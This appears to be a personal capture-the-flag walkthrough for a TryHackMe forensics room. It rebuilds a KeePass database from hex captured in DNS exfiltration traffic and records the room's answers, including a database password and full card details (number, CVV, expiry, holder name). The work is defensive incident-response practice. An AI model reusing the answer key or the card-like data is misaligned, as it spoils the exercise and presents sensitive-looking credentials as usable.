using cyberchef remove whitespace and we get

03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE5805216AFC5AFF03040001000000042000AF4DE7A467FADFBFEBEB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC052000516334C81F95A871AE6F5C6BB97075B74C6016ADAD4C35B3A327BFF48B837B4806080060EA0000000000000710000F22FE38943F8ED485C92DA84BCCE2E2082000C47157BAF0E6A7EF35A00731B6CE6192813F7AC951F0C6460D89A27D91DE15C50920007187B84DD4E121AED3668F75F3761E8AAC3169F81025A5AE30D657448F4401890A0400020000000004000D0A0D0A3865AEFAA72AA7E2FC9869F30F566E4F58A19582BDA4C0988D8E9F6C07B1BEE158304DACEAF21C13DA10E879F18F2F7B49A47E0E518937D7D640D840A9AE690350A5FC0688CB812608BF7EA0961092AC88160CD73CD9C28C531FAB846C59856ADD3A3C5079F577FF3DC74C71726EEB7203AD509F72940A6251632C32142CD358EB0EC7316683B8245087121B26BD39A26D6343FC6AA22E0EB3B0DE71F57F58B3FF81CF580E37E900AB73D9B78D9742D5A8689AA2101EBF78DCF2F4259AAB651E288CA9A0640C627B9AD2440560174BAA9109735E6CCDD095245D2412431D354324DE84EE5E70AF87FB9601ABBB801C9C7E4A372EA2F2C0AFD6F013C0F1DA53D059C1020DFE9F62508E225A3CC86068F826698FEEE77CD3DD6E946E09E9FAB1917969ACC1655A1808F2C1CB7023D6F8ED26802B4BFF7B2A9565965ED772114297238AE3BF66BF1AF88ECFC8ECD2AE4015863E0D7399F5DDB7594235E71A88D467BA7521F469B52464178E2166879ACF9CBA0B9BB606CC7D03960C7A676CD72F557E0C2990445E7D9546FED1DDABD30AF2F3E0395CC8B613E43A9F84CE3C76BDAEE97B18E8EB5B7909E68A460009B6EBF73091EC5BFBD729D354A72808ACC4FC826048F4B2BCA14E783B6FA6BAB842289C00561F09041F980B1694CDA157A5A1E6AD811DD14C60311F85905FE4713C07BE4AFB0E1C1DB922FA7272386A88D1E517A579080090B1045F34B838FF61ABDE0366B40A4D7EA7EDAE97B30804E6251399152EAAEAB333BF4B7CDC78912E879DE19C6F64995E0BA3F86A28EE10653821C08F16E8AFE6348E63C4F286FFA1C605110B5D323DF83C8B4EE1098A5FA652A90AF0DCA4310BEB0F508E6FC47437E5A221B8C1860157BE47D91FAD0043A439172F9ABCB946C9F47B10B1B015589EE6167A3B2E9A082AC6DC1FC99670650435C4C508D6D9C378C90255F4FACC7C4D97E877BFC9657E142B8D0D8A2156A6C1FDB767AC6EB96902C9912E02D10A0081FE8F86714F7AAC2EDB1E9BD93206C5ED28C7991021651D8B5AB77CE7BB182EF66263789D49E4C6B93FAEC87E2ADE82D66EA6027F14196A55D937B741281572381AE62DF46E14F8680423019AF92667505498C5C1F23028F668E4610A1215138D9555B1E70FD3516C2DCEFB8A284C1150A7D4E718F3CD000CCAD099876E78F417AEA9A62CBEB07D2E507A0ED6910620595988DD4782D72BFCD1D4E2EB043B58064D646DF5799FE9AED14F5B0BE8AB853DF42561D677D5761685DBC7119EA8DA1AB879E0F6992D06E1E256659D9E8A8F273B3B5316589A6B9F5ED5083ED23976D6200B56EE4B60A0138E50779C5B8620FC91B5A7F978DAB093A9D3DAFC543CB09500A2F4AAAB08E208D52DA5B5F32F6319209A63A4A7727BC3F8A49B141854D517892BE87637BD5CB823D595C8E6119AB4E20FDC5AB8B94C0220DAA81754CE167A13D4B502097F9770E92EBD5D1055CC5A9C6FED4FE085F3BF5332C8D79C47B735007D9E2D4F0F7D25B860D7151AB064EF1D1AA17E9DDF11B1DA6C89CA570CBC208DC5441F433B18C1BEE3EC2199800D0C0226409D333E2462AC62715FA05805E4DCA4839209CB100A30F711D404E429C8FB94E48EE9792A90FADC5AFBD92ED11D6EAD8CF53626B64399A1AABA9B2CB469C09874802F5725027E7CCABDBE2881B4FE82E83E162399D186CA054CC9E31F4250C7CBF001D109B151BA65838D73CDB9BF51150DF8F51BEDCAB0334F3BCEC28990A58A5F358F1A3A46B41E178487324AB9689B89A25DADF101B9431DAD22D4DFFD41C5A9562A4FA5C39C756087CC75D07081A5658ADE122353352F1F15CDA95BFFFE5A5E93F72097F2E1676FD11234DD78FB44493F9B1E96011A558DF5FE02E5988F5EFE926EBC8FEBAED853375B83FE4027D0D5F43A7B59A68DD68D965071B74BC7F28D76161D7B6CF1AB459C0FE12C224D62A1461EABDA71A2E90A5B4482AA4E62107082A6F8FAC809A656EE3B1E59085A24B01C5C9A7691D0C9E4BA0BFF8424DCD6614FB8A338B5FDA779CE490DB9220858127C5A9AF7564316466DF1380EA583D736C92BD631CA071C0D89936AAB0D3E668710B1BFA42A8C672877589069023D99FF75CF0D5F23C8D4AB5029AA4CB11A5D4406B999C718D28F43A1787D7C4D06F4500E5F3865C0C7F2D5F21749D991F7868A511A103C533BED53EB35A3293160895281705364C83C081B6F48F65FCD1961B68ACFFEFE481259C6279A9ED6D232888078C269156085A4CA2F149FDA45D762090C573D21B38D4FE99F071C70CCB2BD98C5251676A03F5FA2B1301F1791CF734158B34FEF2BB49722AF259E18261D5557F87F9EBB3203BEEA8FEE2F7511AAD14D00BBD1D468A8E5C5AEAAE826E31C941CCE46968135E340423ECDD102699B12AD8FE9785078F9AC8D5AD16BA8C7E7573424A15F9E5612F2A4368EFB3409F6BE10994B0C0F7C26F49DEC67791F7A123E9D85CAC71B32163A15F5105B59A4C2C4079243C1F527CA2214C744E22FF7A903907201D11E08350E69A23BD510E1BA9D7EE857746226CC88550A04A57E83DFD4F627372B6ECD8D27D1C9C005FC12831FAA34C97DED4A1175D9BEE28894FCD18B5C010EE02357DA2757B54ADF2FB0BBEE52206FCC7306BA491DDF76F9472E0805BEF72DFDC38CBACF45340D17447FBEB853516FD33B1D166871B316325DB0EA1560F14DB217F1314FCF54280D2687FE7811588BEB71FEDD008C1AEFE46E3AFD71B3B921E7F311F44F570D85FD09FFAB3DF255B350D4110B9F0FE576F864F2A8A4

then choose from hex

save with anything.kdbx 

then open with KeePass with the pass %p9^3!lL^Mz47E2GaT^y

Account Number
4024007128269551
CVV 970
Expiration Date 3/2028
Name Quick Logistics LLC

or like I did in CCT2019 to retrieve the data

ubuntu@tryhackme:~/Desktop/artefacts$ more final1.bin              
03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE5805216AFC5AFF030400010000000420
00AF4DE7A467FADFBFEBEB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC052000516334C8
1F95A871AE6F5C6BB97075B74C6016ADAD4C35B3A327BFF48B837B4806080060EA00000000000007
10000F22FE38943F8ED485C92DA84BCCE2E2082000C47157BAF0E6A7EF35A00731B6CE6192813F7A
C951F0C6460D89A27D91DE15C50920007187B84DD4E121AED3668F75F3761E8AAC3169F81025A5AE
30D657448F4401890A0400020000000004000D0A0D0A3865AEFAA72AA7E2FC9869F30F566E4F58A1
9582BDA4C0988D8E9F6C07B1BEE158304DACEAF21C13DA10E879F18F2F7B49A47E0E518937D7D640
D840A9AE690350A5FC0688CB812608BF7EA0961092AC88160CD73CD9C28C531FAB846C59856ADD3A
3C5079F577FF3DC74C71726EEB7203AD509F72940A6251632C32142CD358EB0EC7316683B8245087
121B26BD39A26D6343FC6AA22E0EB3B0DE71F57F58B3FF81CF580E37E900AB73D9B78D9742D5A868
9AA2101EBF78DCF2F4259AAB651E288CA9A0640C627B9AD2440560174BAA9109735E6CCDD095245D
2412431D354324DE84EE5E70AF87FB9601ABBB801C9C7E4A372EA2F2C0AFD6F013C0F1DA53D059C1
020DFE9F62508E225A3CC86068F826698FEEE77CD3DD6E946E09E9FAB1917969ACC1655A1808F2C1
CB7023D6F8ED26802B4BFF7B2A9565965ED772114297238AE3BF66BF1AF88ECFC8ECD2AE4015863E
0D7399F5DDB7594235E71A88D467BA7521F469B52464178E2166879ACF9CBA0B9BB606CC7D03960C
7A676CD72F557E0C2990445E7D9546FED1DDABD30AF2F3E0395CC8B613E43A9F84CE3C76BDAEE97B
18E8EB5B7909E68A460009B6EBF73091EC5BFBD729D354A72808ACC4FC826048F4B2BCA14E783B6F
A6BAB842289C00561F09041F980B1694CDA157A5A1E6AD811DD14C60311F85905FE4713C07BE4AFB
0E1C1DB922FA7272386A88D1E517A579080090B1045F34B838FF61ABDE0366B40A4D7EA7EDAE97B3
0804E6251399152EAAEAB333BF4B7CDC78912E879DE19C6F64995E0BA3F86A28EE10653821C08F16
E8AFE6348E63C4F286FFA1C605110B5D323DF83C8B4EE1098A5FA652A90AF0DCA4310BEB0F508E6F
C47437E5A221B8C1860157BE47D91FAD0043A439172F9ABCB946C9F47B10B1B015589EE6167A3B2E
9A082AC6DC1FC99670650435C4C508D6D9C378C90255F4FACC7C4D97E877BFC9657E142B8D0D8A21
56A6C1FDB767AC6EB96902C9912E02D10A0081FE8F86714F7AAC2EDB1E9BD93206C5ED28C7991021
651D8B5AB77CE7BB182EF66263789D49E4C6B93FAEC87E2ADE82D66EA6027F14196A55D937B74128
1572381AE62DF46E14F8680423019AF92667505498C5C1F23028F668E4610A1215138D9555B1E70F
D3516C2DCEFB8A284C1150A7D4E718F3CD000CCAD099876E78F417AEA9A62CBEB07D2E507A0ED691
0620595988DD4782D72BFCD1D4E2EB043B58064D646DF5799FE9AED14F5B0BE8AB853DF42561D677
D5761685DBC7119EA8DA1AB879E0F6992D06E1E256659D9E8A8F273B3B5316589A6B9F5ED5083ED2
3976D6200B56EE4B60A0138E50779C5B8620FC91B5A7F978DAB093A9D3DAFC543CB09500A2F4AAAB
08E208D52DA5B5F32F6319209A63A4A7727BC3F8A49B141854D517892BE87637BD5CB823D595C8E6
119AB4E20FDC5AB8B94C0220DAA81754CE167A13D4B502097F9770E92EBD5D1055CC5A9C6FED4FE0
85F3BF5332C8D79C47B735007D9E2D4F0F7D25B860D7151AB064EF1D1AA17E9DDF11B1DA6C89CA57
0CBC208DC5441F433B18C1BEE3EC2199800D0C0226409D333E2462AC62715FA05805E4DCA4839209
CB100A30F711D404E429C8FB94E48EE9792A90FADC5AFBD92ED11D6EAD8CF53626B64399A1AABA9B
2CB469C09874802F5725027E7CCABDBE2881B4FE82E83E162399D186CA054CC9E31F4250C7CBF001
D109B151BA65838D73CDB9BF51150DF8F51BEDCAB0334F3BCEC28990A58A5F358F1A3A46B41E1784
87324AB9689B89A25DADF101B9431DAD22D4DFFD41C5A9562A4FA5C39C756087CC75D07081A5658A
DE122353352F1F15CDA95BFFFE5A5E93F72097F2E1676FD11234DD78FB44493F9B1E96011A558DF5
FE02E5988F5EFE926EBC8FEBAED853375B83FE4027D0D5F43A7B59A68DD68D965071B74BC7F28D76
161D7B6CF1AB459C0FE12C224D62A1461EABDA71A2E90A5B4482AA4E62107082A6F8FAC809A656EE
3B1E59085A24B01C5C9A7691D0C9E4BA0BFF8424DCD6614FB8A338B5FDA779CE490DB9220858127C
5A9AF7564316466DF1380EA583D736C92BD631CA071C0D89936AAB0D3E668710B1BFA42A8C672877
589069023D99FF75CF0D5F23C8D4AB5029AA4CB11A5D4406B999C718D28F43A1787D7C4D06F4500E
5F3865C0C7F2D5F21749D991F7868A511A103C533BED53EB35A3293160895281705364C83C081B6F
48F65FCD1961B68ACFFEFE481259C6279A9ED6D232888078C269156085A4CA2F149FDA45D762090C
573D21B38D4FE99F071C70CCB2BD98C5251676A03F5FA2B1301F1791CF734158B34FEF2BB49722AF
259E18261D5557F87F9EBB3203BEEA8FEE2F7511AAD14D00BBD1D468A8E5C5AEAAE826E31C941CCE
46968135E340423ECDD102699B12AD8FE9785078F9AC8D5AD16BA8C7E7573424A15F9E5612F2A436
8EFB3409F6BE10994B0C0F7C26F49DEC67791F7A123E9D85CAC71B32163A15F5105B59A4C2C40792
43C1F527CA2214C744E22FF7A903907201D11E08350E69A23BD510E1BA9D7EE857746226CC88550A
04A57E83DFD4F627372B6ECD8D27D1C9C005FC12831FAA34C97DED4A1175D9BEE28894FCD18B5C01
0EE02357DA2757B54ADF2FB0BBEE52206FCC7306BA491DDF76F9472E0805BEF72DFDC38CBACF4534
0D17447FBEB853516FD33B1D166871B316325DB0EA1560F14DB217F1314FCF54280D2687FE781158
8BEB71FEDD008C1AEFE46E3AFD71B3B921E7F311F44F570D85FD09FFAB3DF255B350D4110B9F0FE5
76F864F2A8A4

ubuntu@tryhackme:~/Desktop/artefacts$ xxd -r -p final1.bin  output.kdbx
ubuntu@tryhackme:~/Desktop/artefacts$ file output.kdbx 
output.kdbx: Keepass password database 2.x KDBX

Was really fun!

```

What software is used by the attacker to host its presumed file/payload server?

Review the headers of the HTTP requests going to the server hosting malicious files used by the attacker.

*python*

What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Using the known bad domains, find the C2 traffic and follow the streams.

*POST*

What is the protocol used during the exfiltration activity?

![[Pasted image 20230415172902.png]]

*DNS*

What is the password of the exfiltrated file?  

The password is stored in the database file accessed by the attacker using the sq3.exe binary.

*%p9^3!lL^Mz47E2GaT^y*

What is the credit card number stored inside the exfiltrated file?

Retrieve the exfiltrated file first using Tshark and focus on the query type used shown in the PowerShell logs.

![[Pasted image 20230415180903.png]]

![[Pasted image 20230415181230.png]]

![[Pasted image 20230415183332.png]]

*4024007128269551*


[[Warzone 2]]